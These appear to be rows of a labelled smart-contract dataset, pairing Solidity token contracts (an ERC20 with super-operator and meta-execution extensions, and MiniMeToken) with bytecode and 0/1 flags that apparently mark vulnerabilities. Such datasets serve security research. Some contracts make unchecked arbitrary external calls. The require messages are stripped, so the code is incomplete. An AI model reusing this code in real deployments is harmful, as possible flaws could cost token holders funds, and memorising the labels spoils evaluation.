(uint8) { return uint8(18); } /// @notice Transfer `amount` tokens to `to`. /// @param to the recipient address of the tokens transfered. /// @param amount the number of tokens transfered. /// @return true if success. function transfer(address to, uint256 amount) public returns (bool success) { _transfer(msg.sender, to, amount); return true; } /// @notice Transfer `amount` tokens from `from` to `to`. /// @param from whose token it is transferring from. /// @param to the recipient address of the tokens transfered. /// @param amount the number of tokens transfered. /// @return true if success. function transferFrom(address from, address to, uint256 amount) public returns (bool success) { if (msg.sender != from && !_superOperators[msg.sender]) { uint256 currentAllowance = _allowances[from][msg.sender]; if (currentAllowance != (2**256) - 1) { // save gas when allowance is maximal by not reducing it (see https://github.com/ethereum/EIPs/issues/717) require(currentAllowance >= amount, ); _allowances[from][msg.sender] = currentAllowance - amount; } } _transfer(from, to, amount); return true; } /// @notice burn `amount` tokens. /// @param amount the number of tokens to burn. /// @return true if success. function burn(uint256 amount) external returns (bool) { _burn(msg.sender, amount); return true; } /// @notice burn `amount` tokens from `owner`. /// @param owner address whose token is to burn. /// @param amount the number of token to burn. /// @return true if success. function burnFor(address owner, uint256 amount) external returns (bool) { _burn(owner, amount); return true; } /// @notice approve `spender` to transfer `amount` tokens. /// @param spender address to be given rights to transfer. /// @param amount the number of tokens allowed. /// @return true if success. function approve(address spender, uint256 amount) public returns (bool success) { _approveFor(msg.sender, spender, amount); return true; } /// @notice approve `spender` to transfer `amount` tokens from `owner`. /// @param owner address whose token is allowed. /// @param spender address to be given rights to transfer. /// @param amount the number of tokens allowed. /// @return true if success. function approveFor(address owner, address spender, uint256 amount) public returns (bool success) { require( msg.sender == owner || _superOperators[msg.sender], ); _approveFor(owner, spender, amount); return true; } function addAllowanceIfNeeded(address owner, address spender, uint256 amountNeeded) public returns (bool success) { require( msg.sender == owner || _superOperators[msg.sender], ); _addAllowanceIfNeeded(owner, spender, amountNeeded); return true; } function _addAllowanceIfNeeded(address owner, address spender, uint256 amountNeeded) internal { if(amountNeeded > 0 && !isSuperOperator(spender)) { uint256 currentAllowance = _allowances[owner][spender]; if(currentAllowance < amountNeeded) { _approveFor(owner, spender, amountNeeded); } } } function _approveFor(address owner, address spender, uint256 amount) internal { require( owner != address(0) && spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer(address from, address to, uint256 amount) internal { require(to != address(0), ); uint256 currentBalance = _balances[from]; require(currentBalance >= amount, ); _balances[from] = currentBalance - amount; _balances[to] += amount; emit Transfer(from, to, amount); } function _mint(address to, uint256 amount) internal { require(to != address(0), ); require(amount > 0, ); uint256 currentTotalSupply = _totalSupply; uint256 newTotalSupply = currentTotalSupply + amount; require(newTotalSupply > currentTotalSupply, ); _totalSupply = newTotalSupply; _balances[to] += amount; emit Transfer(address(0), to, amount); } function _burn(address from, uint256 amount) internal { require(amount > 0, ); if (msg.sender != from && !_superOperators[msg.sender]) { uint256 currentAllowance = _allowances[from][msg.sender]; require( currentAllowance >= amount, ); if (currentAllowance != (2**256) - 1) { // save gas when allowance is maximal by not reducing it (see https://github.com/ethereum/EIPs/issues/717) _allowances[from][msg.sender] = currentAllowance - amount; } } uint256 currentBalance = _balances[from]; require(currentBalance >= amount, ); _balances[from] = currentBalance - amount; _totalSupply -= amount; emit Transfer(from, address(0), amount); } } pragma solidity 0.5.9; import ; contract ERC20BasicApproveExtension { /// @notice approve `target` to spend `amount` and call it with data. /// @param target address to be given rights to transfer and destination of the call. /// @param amount the number of tokens allowed. /// @param data bytes for the call. /// @return data of the call. function approveAndCall( address target, uint256 amount, bytes calldata data ) external payable returns (bytes memory) { require( BytesUtil.doFirstParamEqualsAddress(data, msg.sender), ); _approveFor(msg.sender, target, amount); // solium-disable-next-line security/no-call-value (bool success, bytes memory returnData) = target.call.value(msg.value)(data); require(success, string(returnData)); return returnData; } /// @notice temporarly approve `target` to spend `amount` and call it with data. Previous approvals remains unchanged. /// @param target destination of the call, allowed to spend the amount specified /// @param amount the number of tokens allowed to spend. /// @param data bytes for the call. /// @return data of the call. function paidCall( address target, uint256 amount, bytes calldata data ) external payable returns (bytes memory) { require( BytesUtil.doFirstParamEqualsAddress(data, msg.sender), ); if (amount > 0) { _addAllowanceIfNeeded(msg.sender, target, amount); } // solium-disable-next-line security/no-call-value (bool success, bytes memory returnData) = target.call.value(msg.value)(data); require(success, string(returnData)); return returnData; } function _approveFor(address owner, address target, uint256 amount) internal; function _addAllowanceIfNeeded(address owner, address spender, uint256 amountNeeded) internal; } pragma solidity 0.5.9; contract ERC20ExecuteExtension { /// @dev _executionAdmin != _admin so that this super power can be disabled independently address internal _executionAdmin; event ExecutionAdminAdminChanged(address oldAdmin, address newAdmin); /// @notice give the address responsible for adding execution rights. /// @return address of the execution administrator. function getExecutionAdmin() external view returns (address) { return _executionAdmin; } /// @notice change the execution adminstrator to be `newAdmin`. /// @param newAdmin address of the new administrator. function changeExecutionAdmin(address newAdmin) external { require(msg.sender == _executionAdmin, ); emit ExecutionAdminAdminChanged(_executionAdmin, newAdmin); _executionAdmin = newAdmin; } mapping(address => bool) internal _executionOperators; event ExecutionOperator(address executionOperator, bool enabled); /// @notice set `executionOperator` as executionOperator: `enabled`. /// @param executionOperator address that will be given/removed executionOperator right. /// @param enabled set whether the executionOperator is enabled or disabled. function setExecutionOperator(address executionOperator, bool enabled) external { require( msg.sender == _executionAdmin, ); _executionOperators[executionOperator] = enabled; emit ExecutionOperator(executionOperator, enabled); } /// @notice check whether address `who` is given executionOperator rights. /// @param who The address to query. /// @return whether the address has executionOperator rights. function isExecutionOperator(address who) public view returns (bool) { return _executionOperators[who]; } /// @notice execute on behalf of the contract. /// @param to destination address fo the call. /// @param gasLimit exact amount of gas to be passed to the call. /// @param data the bytes sent to the destination address. /// @return success whether the execution was successful. /// @return returnData data resulting from the execution. function executeWithSpecificGas(address to, uint256 gasLimit, bytes calldata data) external returns (bool success, bytes memory returnData) { require(_executionOperators[msg.sender], ); (success, returnData) = to.call.gas(gasLimit)(data); assert(gasleft() > gasLimit / 63); // not enough gas provided, assert to throw all gas // TODO use EIP-1930 } /// @notice approve a specific amount of token for `from` and execute on behalf of the contract. /// @param from address of which token will be transfered. /// @param to destination address fo the call. /// @param amount number of tokens allowed that can be transfer by the code at `to`. /// @param gasLimit exact amount of gas to be passed to the call. /// @param data the bytes sent to the destination address. /// @return success whether the execution was successful. /// @return returnData data resulting from the execution. function approveAndExecuteWithSpecificGas( address from, address to, uint256 amount, uint256 gasLimit, bytes calldata data ) external returns (bool success, bytes memory returnData) { require(_executionOperators[msg.sender], ); return _approveAndExecuteWithSpecificGas(from, to, amount, gasLimit, data); } /// @dev the reason for this function is that charging for gas here is more gas-efficient than doing it in the caller. /// @notice approve a specific amount of token for `from` and execute on behalf of the contract. Plus charge the gas required to perform it. /// @param from address of which token will be transfered. /// @param to destination address fo the call. /// @param amount number of tokens allowed that can be transfer by the code at `to`. /// @param gasLimit exact amount of gas to be passed to the call. /// @param tokenGasPrice price in token for the gas to be charged. /// @param baseGasCharge amount of gas charged on top of the gas used for the call. /// @param tokenReceiver recipient address of the token charged for the gas used. /// @param data the bytes sent to the destination address. /// @return success whether the execution was successful. /// @return returnData data resulting from the execution. function approveAndExecuteWithSpecificGasAndChargeForIt( address from, address to, uint256 amount, uint256 gasLimit, uint256 tokenGasPrice, uint256 baseGasCharge, address tokenReceiver, bytes calldata data ) external returns (bool success, bytes memory returnData) { uint256 initialGas = gasleft(); require(_executionOperators[msg.sender], ); (success, returnData) = _approveAndExecuteWithSpecificGas(from, to, amount, gasLimit, data); if (tokenGasPrice > 0) { _charge(from, gasLimit, tokenGasPrice, initialGas, baseGasCharge, tokenReceiver); } } /// @notice transfer 1amount1 token from `from` to `to` and charge the gas required to perform that transfer. /// @param from address of which token will be transfered. /// @param to destination address fo the call. /// @param amount number of tokens allowed that can be transfer by the code at `to`. /// @param gasLimit exact amount of gas to be passed to the call. /// @param tokenGasPrice price in token for the gas to be charged. /// @param baseGasCharge amount of gas charged on top of the gas used for the call. /// @param tokenReceiver recipient address of the token charged for the gas used. /// @return whether the transfer was successful. function transferAndChargeForGas( address from, address to, uint256 amount, uint256 gasLimit, uint256 tokenGasPrice, uint256 baseGasCharge, address tokenReceiver ) external returns (bool) { uint256 initialGas = gasleft(); require(_executionOperators[msg.sender], ); _transfer(from, to, amount); if (tokenGasPrice > 0) { _charge(from, gasLimit, tokenGasPrice, initialGas, baseGasCharge, tokenReceiver); } return true; } function _charge( address from, uint256 gasLimit, uint256 tokenGasPrice, uint256 initialGas, uint256 baseGasCharge, address tokenReceiver ) internal { uint256 gasCharge = initialGas - gasleft(); if(gasCharge > gasLimit) { gasCharge = gasLimit; } gasCharge += baseGasCharge; uint256 tokensToCharge = gasCharge * tokenGasPrice; require(tokensToCharge / gasCharge == tokenGasPrice, ); _transfer(from, tokenReceiver, tokensToCharge); } function _approveAndExecuteWithSpecificGas( address from, address to, uint256 amount, uint256 gasLimit, bytes memory data ) internal returns (bool success, bytes memory returnData) { if (amount > 0) { _addAllowanceIfNeeded(from, to, amount); } (success, returnData) = to.call.gas(gasLimit)(data); assert(gasleft() > gasLimit / 63); // not enough gas provided, assert to throw all gas // TODO use EIP-1930 } function _transfer(address from, address to, uint256 amount) internal; function _addAllowanceIfNeeded(address owner, address spender, uint256 amountNeeded) internal; }",,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
"pragma solidity ^0.4.24;interface ITokenController { function proxyPayment(address _owner) external payable returns(bool); function onTransfer(address _from, address _to, uint _amount) external returns(bool); function onApprove(address _owner, address _spender, uint _amount) external returns(bool);}contract Controlled { modifier onlyController { require(msg.sender == controller); _; } address public controller; function Controlled() public { controller = msg.sender;} function changeController(address _newController) onlyController public { controller = _newController; }}contract ApproveAndCallFallBack { function receiveApproval( address from, uint256 _amount, address _token, bytes _data ) public;}contract MiniMeToken is Controlled { string public name; uint8 public decimals; string public symbol; string public version = ; struct Checkpoint { uint128 fromBlock; uint128 value; } MiniMeToken public parentToken; uint public parentSnapShotBlock; uint public creationBlock; mapping (address => Checkpoint[]) balances; mapping (address => mapping (address => uint256)) allowed; Checkpoint[] totalSupplyHistory; bool public transfersEnabled; MiniMeTokenFactory public tokenFactory; function MiniMeToken( MiniMeTokenFactory _tokenFactory, MiniMeToken _parentToken, uint _parentSnapShotBlock, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, bool _transfersEnabled ) public { tokenFactory = _tokenFactory; name = _tokenName; decimals = _decimalUnits; symbol = _tokenSymbol; parentToken = _parentToken; parentSnapShotBlock = _parentSnapShotBlock; transfersEnabled = _transfersEnabled; creationBlock = block.number; } function transfer(address _to, uint256 _amount) public returns (bool success) { require(transfersEnabled); return doTransfer(msg.sender, _to, _amount); } function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) { if (msg.sender != controller) { require(transfersEnabled); if (allowed[_from][msg.sender] < _amount) return false; allowed[_from][msg.sender] -= _amount; } return doTransfer(_from, _to, _amount); } function doTransfer(address _from, address _to, uint _amount) internal returns(bool) { if (_amount == 0) { return true; } require(parentSnapShotBlock < block.number); require((_to != 0) && (_to != address(this))); var previousBalanceFrom = balanceOfAt(_from, block.number); if (previousBalanceFrom < _amount) { return false; } if (isContract(controller)) { require(ITokenController(controller).onTransfer(_from, _to, _amount) == true); } updateValueAtNow(balances[_from], previousBalanceFrom - _amount); var previousBalanceTo = balanceOfAt(_to, block.number); require(previousBalanceTo + _amount >= previousBalanceTo); updateValueAtNow(balances[_to], previousBalanceTo + _amount); Transfer(_from, _to, _amount); return true; } function balanceOf(address _owner) public constant returns (uint256 balance) { return balanceOfAt(_owner, block.number); } function approve(address _spender, uint256 _amount) public returns (bool success) { require(transfersEnabled); require((_amount == 0) || (allowed[msg.sender][_spender] == 0)); if (isContract(controller)) { require(ITokenController(controller).onApprove(msg.sender, _spender, _amount) == true); } allowed[msg.sender][_spender] = _amount; Approval(msg.sender, _spender, _amount); return true; } function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { return allowed[_owner][_spender]; } function approveAndCall(ApproveAndCallFallBack _spender, uint256 _amount, bytes _extraData) public returns (bool success) { require(approve(_spender, _amount)); _spender.receiveApproval( msg.sender, _amount, this, _extraData ); return true; } function totalSupply() public constant returns (uint) { return totalSupplyAt(block.number); } function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint) { if ((balances[_owner].length == 0) || (balances[_owner][0].fromBlock > _blockNumber)) { if (address(parentToken) != 0) { return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock)); } else { return 0; } } else { return getValueAt(balances[_owner], _blockNumber); } } function totalSupplyAt(uint _blockNumber) public constant returns(uint) { if ((totalSupplyHistory.length == 0) || (totalSupplyHistory[0].fromBlock > _blockNumber)) { if (address(parentToken) != 0) { return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock)); } else { return 0; } } else { return getValueAt(totalSupplyHistory, _blockNumber); } } function createCloneToken( string _cloneTokenName, uint8 _cloneDecimalUnits, string _cloneTokenSymbol, uint _snapshotBlock, bool _transfersEnabled ) public returns(MiniMeToken) { uint256 snapshot = _snapshotBlock == 0 ? block.number - 1 : _snapshotBlock; MiniMeToken cloneToken = tokenFactory.createCloneToken( this, snapshot, _cloneTokenName, _cloneDecimalUnits, _cloneTokenSymbol, _transfersEnabled ); cloneToken.changeController(msg.sender); NewCloneToken(address(cloneToken), snapshot); return cloneToken; } function generateTokens(address _owner, uint _amount) onlyController public returns (bool) { uint curTotalSupply = totalSupply(); require(curTotalSupply + _amount >= curTotalSupply); uint previousBalanceTo = balanceOf(_owner); require(previousBalanceTo + _amount >= previousBalanceTo); updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount); updateValueAtNow(balances[_owner], previousBalanceTo + _amount); Transfer(0, _owner, _amount); return true; } function destroyTokens(address _owner, uint _amount) onlyController public returns (bool) { uint curTotalSupply = totalSupply(); require(curTotalSupply >= _amount); uint previousBalanceFrom = balanceOf(_owner); require(previousBalanceFrom >= _amount); updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount); updateValueAtNow(balances[_owner], previousBalanceFrom - _amount); Transfer(_owner, 0, _amount); return true; } function enableTransfers(bool _transfersEnabled) onlyController public { transfersEnabled = _transfersEnabled; } function getValueAt(Checkpoint[] storage checkpoints, uint _block) constant internal returns (uint) { if (checkpoints.length == 0) return 0; if (_block >= checkpoints[checkpoints.length-1].fromBlock) return checkpoints[checkpoints.length-1].value; if (_block < checkpoints[0].fromBlock) return 0; uint min = 0; uint max = checkpoints.length-1; while (max > min) { uint mid = (max + min + 1) / 2; if (checkpoints[mid].fromBlock<=_block) { min = mid; } else { max = mid-1; } } return checkpoints[min].value; } function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value) internal { if ((checkpoints.length == 0) || (checkpoints[checkpoints.length - 1].fromBlock < block.number)) { Checkpoint storage newCheckPoint = checkpoints[checkpoints.length++]; newCheckPoint.fromBlock = uint128(block.number); newCheckPoint.value = uint128(_value); } else { Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length - 1]; oldCheckPoint.value = uint128(_value); } } function isContract(address _addr) constant internal returns(bool) { uint size; if (_addr == 0) return false; assembly { size := extcodesize(_addr) } return size>0; } function min(uint a, uint b) pure internal returns (uint) { return a < b ? a : b; } function () external payable { require(isContract(controller)); require(ITokenController(controller).proxyPayment.value(msg.value)(msg.sender) == true); } function claimTokens(address _token) onlyController public { if (_token == 0x0) { controller.transfer(this.balance); return; } MiniMeToken token = MiniMeToken(_token); uint balance = token.balanceOf(this); token.transfer(controller, balance); ClaimedTokens(_token, controller, balance); } event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount); event Transfer(address indexed _from, address indexed _to, uint256 _amount); event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock); event Approval( address indexed _owner, address indexed _spender, uint256 _amount );}contract MiniMeTokenFactory { function createCloneToken( MiniMeToken _parentToken, uint _snapshotBlock, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, bool _transfersEnabled ) public returns (MiniMeToken) { MiniMeToken newToken = new MiniMeToken( this, _parentToken, _snapshotBlock, _tokenName, _decimalUnits, _tokenSymbol, _transfersEnabled ); newToken.changeController(msg.sender); return newToken; }}",0x6080604052600436106101485763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166306fdde038114610225578063095ea7b3146102af57806317634514146102f457806318160ddd1461031b57806323b872dd14610330578063313ce567146103675780633cebb823146103925780634ee2cd7e146103c057806354fd4d50146103f15780636638c0871461040657806370a08231146104d657806380a5400114610504578063827f32c01461051957806395d89b411461054a578063981b24d01461055f578063a9059cbb14610577578063bef97c87146105a8578063c5bcc4f1146105bd578063cae9ca51146105d2578063d3ce77fe14610648578063dd62ed3e14610679578063df8de3e7146106ad578063e77772fe146106db578063f41e60c5146106f0578063f77c47911461070a575b60005461016a9073ffffffffffffffffffffffffffffffffffffffff1661071f565b151561017557600080fd5b600054604080517ff48c3054000000000000000000000000000000000000000000000000000000008152336004820152905173ffffffffffffffffffffffffffffffffffffffff9092169163f48c3054913491602480830192602092919082900301818588803b1580156101e857600080fd5b505af11580156101fc573d6000803e3d6000fd5b50505050506040513d602081101561021357600080fd5b5051151560011461022357600080fd5b005b34801561023157600080fd5b5061023a610759565b6040805160208082528351818301528351919283929083019185019080838360005b8381101561027457818101518382015260200161025c565b50505050905090810190601f1680156102a15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156102bb57600080fd5b506102e073ffffffffffffffffffffffffffffffffffffffff600435166024356107e6565b604080519115158252519081900360200190f35b34801561030057600080fd5b5061030961099b565b60408051918252519081900360200190f35b34801561032757600080fd5b506103096109a1565b34801561033c57600080fd5b506102e073ffffffffffffffffffffffffffffffffffffffff600435811690602435166044356109b2565b34801561037357600080fd5b5061037c610a70565b6040805160ff9092168252519081900360200190f35b34801561039e57600080fd5b5061022373ffffffffffffffffffffffffffffffffffffffff60043516610a79565b3480156103cc57600080fd5b5061030973ffffffffffffffffffffffffffffffffffffffff60043516602435610ae4565b3480156103fd57600080fd5b5061023a610cae565b34801561041257600080fd5b506040805160206004803580820135601f81018490048402850184019095528484526104ad94369492936024939284019190819084018382808284375050604080516020601f818a01358b0180359182018390048302840183018552818452989b60ff8b35169b909a909994019750919550918201935091508190840183828082843750949750508435955050505050602001351515610d09565b6040805173ffffffffffffffffffffffffffffffffffffffff9092168252519081900360200190f35b3480156104e257600080fd5b5061030973ffffffffffffffffffffffffffffffffffffffff60043516610f96565b34801561051057600080fd5b506104ad610faa565b34801561052557600080fd5b506102e073ffffffffffffffffffffffffffffffffffffffff60043516602435610fc6565b34801561055657600080fd5b5061023a6110b9565b34801561056b57600080fd5b50610309600435611114565b34801561058357600080fd5b506102e073ffffffffffffffffffffffffffffffffffffffff60043516602435611244565b3480156105b457600080fd5b506102e0611263565b3480156105c957600080fd5b5061030961126c565b3480156105de57600080fd5b50604080516020600460443581810135601f81018490048402850184019095528484526102e094823573ffffffffffffffffffffffffffffffffffffffff169460248035953695946064949201919081908401838280828437509497506112729650505050505050565b34801561065457600080fd5b506102e073ffffffffffffffffffffffffffffffffffffffff6004351660243561139a565b34801561068557600080fd5b5061030973ffffffffffffffffffffffffffffffffffffffff60043581169060243516611489565b3480156106b957600080fd5b5061022373ffffffffffffffffffffffffffffffffffffffff600435166114c1565b3480156106e757600080fd5b506104ad6116f6565b3480156106fc57600080fd5b506102236004351515611717565b34801561071657600080fd5b506104ad61176c565b60008073ffffffffffffffffffffffffffffffffffffffff831615156107485760009150610753565b823b90506000811191505b50919050565b60018054604080516020600284861615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156107de5780601f106107b3576101008083540402835291602001916107de565b820191906000526020600020905b8154815290600101906020018083116107c157829003601f168201915b505050505081565b600b5460009060ff1615156107fa57600080fd5b811580610835575033600090815260096020908152604080832073ffffffffffffffffffffffffffffffffffffffff87168452909152902054155b151561084057600080fd5b6000546108629073ffffffffffffffffffffffffffffffffffffffff1661071f565b156109265760008054604080517fda682aeb00000000000000000000000000000000000000000000000000000000815233600482015273ffffffffffffffffffffffffffffffffffffffff8781166024830152604482018790529151919092169263da682aeb92606480820193602093909283900390910190829087803b1580156108ec57600080fd5b505af1158015610900573d6000803e3d6000fd5b505050506040513d602081101561091657600080fd5b5051151560011461092657600080fd5b33600081815260096020908152604080832073ffffffffffffffffffffffffffffffffffffffff881680855290835292819020869055805186815290519293927f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925929181900390910190a35060015b92915050565b60075481565b60006109ac43611114565b90505b90565b6000805473ffffffffffffffffffffffffffffffffffffffff163314610a5b57600b5460ff1615156109e357600080fd5b73ffffffffffffffffffffffffffffffffffffffff84166000908152600960209081526040808320338452909152902054821115610a2357506000610a69565b73ffffffffffffffffffffffffffffffffffffffff841660009081526009602090815260408083203384529091529020805483900390555b610a66848484611788565b90505b9392505050565b60025460ff1681565b60005473ffffffffffffffffffffffffffffffffffffffff163314610a9d57600080fd5b600080547fffffffffffffffffffffffff00000000000000000000000000000000000000001673ffffffffffffffffffffffffffffffffffffffff92909216919091179055565b73ffffffffffffffffffffffffffffffffffffffff82166000908152600860205260408120541580610b63575073ffffffffffffffffffffffffffffffffffffffff8316600090815260086020526040812080548492908110610b4357fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff16115b15610c785760055473ffffffffffffffffffffffffffffffffffffffff1615610c705760055460065473ffffffffffffffffffffffffffffffffffffffff90911690634ee2cd7e908590610bb89086906119e5565b6040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b158015610c3d57600080fd5b505af1158015610c51573d6000803e3d6000fd5b505050506040513d6020811015610c6757600080fd5b50519050610995565b506000610995565b73ffffffffffffffffffffffffffffffffffffffff83166000908152600860205260409020610ca790836119fb565b9050610995565b6004805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156107de5780601f106107b3576101008083540402835291602001916107de565b600080808415610d195784610d1e565b600143035b600b546040517f5b7b72c100000000000000000000000000000000000000000000000000000000815230600482018181526024830185905260ff8c16606484015288151560a484015260c0604484019081528d5160c48501528d5195975061010090940473ffffffffffffffffffffffffffffffffffffffff1694635b7b72c194929388938f938f938f938e9391608482019160e40190602089019080838360005b83811015610dd8578181015183820152602001610dc0565b50505050905090810190601f168015610e055780820380516001836020036101000a031916815260200191505b50838103825285518152855160209182019187019080838360005b83811015610e38578181015183820152602001610e20565b50505050905090810190601f168015610e655780820380516001836020036101000a031916815260200191505b5098505050505050505050602060405180830381600087803b158015610e8a57600080fd5b505af1158015610e9e573d6000803e3d6000fd5b505050506040513d6020811015610eb457600080fd5b5051604080517f3cebb823000000000000000000000000000000000000000000000000000000008152336004820152905191925073ffffffffffffffffffffffffffffffffffffffff831691633cebb8239160248082019260009290919082900301818387803b158015610f2757600080fd5b505af1158015610f3b573d6000803e3d6000fd5b505060408051858152905173ffffffffffffffffffffffffffffffffffffffff851693507f086c875b377f900b07ce03575813022f05dd10ed7640b5282cf6d3c3fc352ade92509081900360200190a2979650505050505050565b6000610fa28243610ae4565b90505b919050565b60055473ffffffffffffffffffffffffffffffffffffffff1681565b600080548190819073ffffffffffffffffffffffffffffffffffffffff163314610fef57600080fd5b610ff76109a1565b915083820182111561100857600080fd5b61101185610f96565b905083810181111561102257600080fd5b61102f600a858401611b87565b73ffffffffffffffffffffffffffffffffffffffff8516600090815260086020526040902061106090828601611b87565b60408051858152905173ffffffffffffffffffffffffffffffffffffffff8716916000917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a3506001949350505050565b6003805460408051602060026001851615610100026000190190941693909304601f810184900484028201840190925281815292918301828280156107de5780601f106107b3576101008083540402835291602001916107de565b600a546000901580611152575081600a600081548110151561113257fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff16115b156112325760055473ffffffffffffffffffffffffffffffffffffffff161561122a5760055460065473ffffffffffffffffffffffffffffffffffffffff9091169063981b24d0906111a59085906119e5565b6040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b1580156111f757600080fd5b505af115801561120b573d6000803e3d6000fd5b505050506040513d602081101561122157600080fd5b50519050610fa5565b506000610fa5565b61123d600a836119fb565b9050610fa5565b600b5460009060ff16151561125857600080fd5b610a69338484611788565b600b5460ff1681565b60065481565b600061127e84846107e6565b151561128957600080fd5b6040517f8f4ffcb1000000000000000000000000000000000000000000000000000000008152336004820181815260248301869052306044840181905260806064850190815286516084860152865173ffffffffffffffffffffffffffffffffffffffff8a1695638f4ffcb195948a94938a939192909160a490910190602085019080838360005b83811015611329578181015183820152602001611311565b50505050905090810190601f1680156113565780820380516001836020036101000a031916815260200191505b5095505050505050600060405180830381600087803b15801561137857600080fd5b505af115801561138c573d6000803e3d6000fd5b506001979650505050505050565b600080548190819073ffffffffffffffffffffffffffffffffffffffff1633146113c357600080fd5b6113cb6109a1565b9150838210156113da57600080fd5b6113e385610f96565b9050838110156113f257600080fd5b6113ff600a858403611b87565b73ffffffffffffffffffffffffffffffffffffffff8516600090815260086020526040902061143090858303611b87565b60408051858152905160009173ffffffffffffffffffffffffffffffffffffffff8816917fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef9181900360200190a3506001949350505050565b73ffffffffffffffffffffffffffffffffffffffff918216600090815260096020908152604080832093909416825291909152205490565b60008054819073ffffffffffffffffffffffffffffffffffffffff1633146114e857600080fd5b73ffffffffffffffffffffffffffffffffffffffff83161515611553576000805460405173ffffffffffffffffffffffffffffffffffffffff90911691303180156108fc02929091818181858888f1935050505015801561154d573d6000803e3d6000fd5b506116f1565b604080517f70a08231000000000000000000000000000000000000000000000000000000008152306004820152905184935073ffffffffffffffffffffffffffffffffffffffff8416916370a082319160248083019260209291908290030181600087803b1580156115c457600080fd5b505af11580156115d8573d6000803e3d6000fd5b505050506040513d60208110156115ee57600080fd5b505160008054604080517fa9059cbb00000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff92831660048201526024810185905290519394509085169263a9059cbb92604480840193602093929083900390910190829087803b15801561167157600080fd5b505af1158015611685573d6000803e3d6000fd5b505050506040513d602081101561169b57600080fd5b505060005460408051838152905173ffffffffffffffffffffffffffffffffffffffff928316928616917ff931edb47c50b4b4104c187b5814a9aef5f709e17e2ecf9617e860cacade929c919081900360200190a35b505050565b600b54610100900473ffffffffffffffffffffffffffffffffffffffff1681565b60005473ffffffffffffffffffffffffffffffffffffffff16331461173b57600080fd5b600b80547fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0016911515919091179055565b60005473ffffffffffffffffffffffffffffffffffffffff1681565b6000808083151561179c57600192506119dc565b60065443116117aa57600080fd5b73ffffffffffffffffffffffffffffffffffffffff8516158015906117e5575073ffffffffffffffffffffffffffffffffffffffff85163014155b15156117f057600080fd5b6117fa8643610ae4565b91508382101561180d57600092506119dc565b60005461182f9073ffffffffffffffffffffffffffffffffffffffff1661071f565b156118f55760008054604080517f4a39314900000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff8a8116600483015289811660248301526044820189905291519190921692634a39314992606480820193602093909283900390910190829087803b1580156118bb57600080fd5b505af11580156118cf573d6000803e3d6000fd5b505050506040513d60208110156118e557600080fd5b505115156001146118f557600080fd5b73ffffffffffffffffffffffffffffffffffffffff8616600090815260086020526040902061192690858403611b87565b6119308543610ae4565b905083810181111561194157600080fd5b73ffffffffffffffffffffffffffffffffffffffff8516600090815260086020526040902061197290828601611b87565b8473ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef866040518082815260200191505060405180910390a3600192505b50509392505050565b60008183106119f45781610a69565b5090919050565b600080600080858054905060001415611a175760009350611b7e565b855486906000198101908110611a2957fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff168510611a9857855486906000198101908110611a5f57fe5b60009182526020909120015470010000000000000000000000000000000090046fffffffffffffffffffffffffffffffff169350611b7e565b856000815481101515611aa757fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff16851015611ad55760009350611b7e565b8554600093506000190191505b82821115611b3b576002600183850101049050848682815481101515611b0457fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff1611611b2f57809250611b36565b6001810391505b611ae2565b8583815481101515611b4957fe5b60009182526020909120015470010000000000000000000000000000000090046fffffffffffffffffffffffffffffffff1693505b50505092915050565b815460009081901580611bc957508354439085906000198101908110611ba957fe5b6000918252602090912001546fffffffffffffffffffffffffffffffff16105b15611c535783548490611bdf8260018301611ca7565b81548110611be957fe5b600091825260209091200180546fffffffffffffffffffffffffffffffff858116700100000000000000000000000000000000024382167fffffffffffffffffffffffffffffffff0000000000000000000000000000000090931692909217161781559150611ca1565b835484906000198101908110611c6557fe5b600091825260209091200180546fffffffffffffffffffffffffffffffff80861670010000000000000000000000000000000002911617815590505b50505050565b8154818355818111156116f1576000838152602090206116f19181019083016109af91905b80821115611ce05760008155600101611ccc565b50905600a165627a7a723058205a44c4b66ea238cd7a06e7714f5b8c9ceea8c41953f9c86ff6a9900ab440c1430029,0,0,0,0,0,1,0,0,0,1,0,0,1,1,0,0,0
